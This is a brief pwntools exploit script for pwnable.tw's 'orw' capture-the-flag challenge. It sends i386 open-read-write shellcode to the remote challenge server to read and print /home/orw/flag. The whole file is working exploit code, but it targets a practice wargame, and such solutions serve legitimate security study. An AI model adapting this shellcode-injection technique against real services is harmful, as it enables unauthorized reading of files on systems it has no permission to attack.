from pwn import * 

# sh = process('./orw')
sh = remote('chall.pwnable.tw', 10001)
context.log_level = 'debug'
context.arch = 'i386'
# gdb.attach(sh)


shellcode = shellcraft.open('/home/orw/flag')
shellcode += shellcraft.read(3,0x0804A100,0x20)
shellcode += shellcraft.write(1,0x0804A100,0x20)
# log.success(str(len(asm(shellcode))))
sh.sendafter('Give my your shellcode:', asm(shellcode))


sh.interactive()